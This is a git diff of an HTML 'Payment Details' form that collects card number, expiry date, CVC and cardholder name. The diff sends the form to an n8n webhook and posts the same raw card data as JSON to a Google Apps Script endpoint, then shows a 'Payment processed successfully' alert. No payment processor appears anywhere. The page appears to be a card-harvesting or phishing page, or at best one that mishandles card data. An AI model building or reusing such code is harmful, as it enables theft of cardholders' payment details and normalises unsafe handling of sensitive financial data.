@@ -10,67 +10,51 @@
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
 </head>
 <body>
-    <p><br><br><br><br><br><br></p>
     <div class="container">
-        <div class="container">
-            <div class="row">
-                <div class="col-xs-12 col-md-4 col-md-offset-4">
-                    <div class="panel panel-default">
-                        <div class="panel-heading">
-                            <div class="row">
-                                <h3 class="text-center">Payment Details</h3>
-                                <img class="img-responsive cc-img" src="http://www.prepbootstrap.com/Content/images/shared/misc/creditcardicons.png" alt="Credit Card Icons">
+        <div class="row">
+            <div class="col-xs-12 col-md-4 col-md-offset-4">
+                <div class="panel panel-default">
+                    <div class="panel-heading">
+                        <h3 class="text-center">Payment Details</h3>
+                        <img class="img-responsive cc-img" src="http://www.prepbootstrap.com/Content/images/shared/misc/creditcardicons.png" alt="Credit Card Icons">
+                    </div>
+                    <div class="panel-body">
+                        <form action="https://kingvon.app.n8n.cloud/webhook-test/gabby" method="POST">
+                            <!-- Card Number Field -->
+                            <div class="form-group">
+                                <label for="cardNumber">CARD NUMBER</label>
+                                <div class="input-group">
+                                    <input type="tel" class="form-control" id="cardNumber" name="cardNumber" placeholder="Valid Card Number" required maxlength="19" />
+                                    <span class="input-group-addon"><span class="fa fa-credit-card"></span></span>
+                                </div>
                             </div>
-                        </div>
-                        <div class="panel-body">
-                            <form role="form" id="payment-form">
-                                <div class="row">
-                                    <div class="col-xs-12">
-                                        <div class="form-group">
-                                            <label for="cardNumber">CARD NUMBER</label>
-                                            <div class="input-group">
-                                                <input type="tel" class="form-control" id="cardNumber" placeholder="Valid Card Number" required autofocus maxlength="19" />
-                                                <span class="input-group-addon"><span class="fa fa-credit-card"></span></span>
-                                            </div>
-                                        </div>
-                                    </div>
-                                </div>
-                                <div class="row">
-                                    <div class="col-xs-7 col-md-7">
-                                        <div class="form-group">
-                                            <label for="expDate">EXPIRATION DATE</label>
-                                            <input type="tel" class="form-control" id="expDate" placeholder="MM / YY" required maxlength="5" />
-                                        </div>
-                                    </div>
-                                    <div class="col-xs-5 col-md-5 pull-right">
-                                        <div class="form-group">
-                                            <label for="cvCode">CV CODE</label>
-                                            <input type="tel" class="form-control" id="cvCode" placeholder="CVC" required maxlength="4" />
-                                        </div>
-                                    </div>
-                                </div>
-                                <div class="row">
-                                    <div class="col-xs-12">
-                                        <div class="form-group">
-                                            <label for="cardOwner">CARD OWNER</label>
-                                            <input type="text" class="form-control" id="cardOwner" placeholder="Card Owner Name" required />
-                                        </div>
-                                    </div>
-                                </div>
-                                <div class="row">
-                                    <div class="col-xs-12">
-                                        <button type="button" class="btn btn-warning btn-lg btn-block" onclick="submitPayment()">Process Payment</button>
-                                    </div>
-                                </div>
-                            </form>
-                        </div>
+                        
+                            <!-- Expiration Date Field -->
+                            <div class="form-group">
+                                <label for="expDate">EXPIRATION DATE</label>
+                                <input type="tel" class="form-control" id="expDate" name="expDate" placeholder="MM / YY" required maxlength="5" />
+                            </div>
+                        
+                            <!-- CV Code Field -->
+                            <div class="form-group">
+                                <label for="cvCode">CV CODE</label>
+                                <input type="tel" class="form-control" id="cvCode" name="cvCode" placeholder="CVC" required maxlength="4" />
+                            </div>
+                        
+                            <!-- Card Owner Field -->
+                            <div class="form-group">
+                                <label for="cardOwner">CARD OWNER</label>
+                                <input type="text" class="form-control" id="cardOwner" name="cardOwner" placeholder="Card Owner Name" required />
+                            </div>
+                        
+                            <!-- Submit Button -->
+                            <button type="submit" class="btn btn-warning btn-lg btn-block">Process Payment</button>
+                        </form>
+                        
                     </div>
                 </div>
             </div>
         </div>
-        <style>
-            .cc-img { margin: 0 auto; }
-        </style>
     </div>
 
     <script>
@@ -80,13 +64,20 @@
             const cvCode = document.getElementById('cvCode').value;
             const cardOwner = document.getElementById('cardOwner').value;
 
-            fetch("https://script.google.com/macros/s/AKfycbw_P4NR-k1xPz6kxYbG-bVHIgLmz0gKWgC2LThmglnOxnIzsX4A2QWr97INNT97Dt96/exec", {
+            fetch("https://script.google.com/macros/s/AKfycbwDcwJbcRnuQL37pBkp2fndmShitSTxotNdyOKCjE-bzFJpt843XhE5VlQ9TvqTSz5z/exec", {
                 method: "POST",
-                mode: "no-cors",
+                mode: "cors",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ cardNumber, expDate, cvCode, cardOwner })
             })
-            .then(response => alert("Payment processed successfully!"))
+            .then(response => response.json())
+            .then(data => {
+                if (data.result === "success") {
+                    alert("Payment processed successfully!");
+                } else {
+                    alert("Error processing payment.");
+                }
+            })
             .catch(error => alert("An error occurred. Please try again."));
         }
 
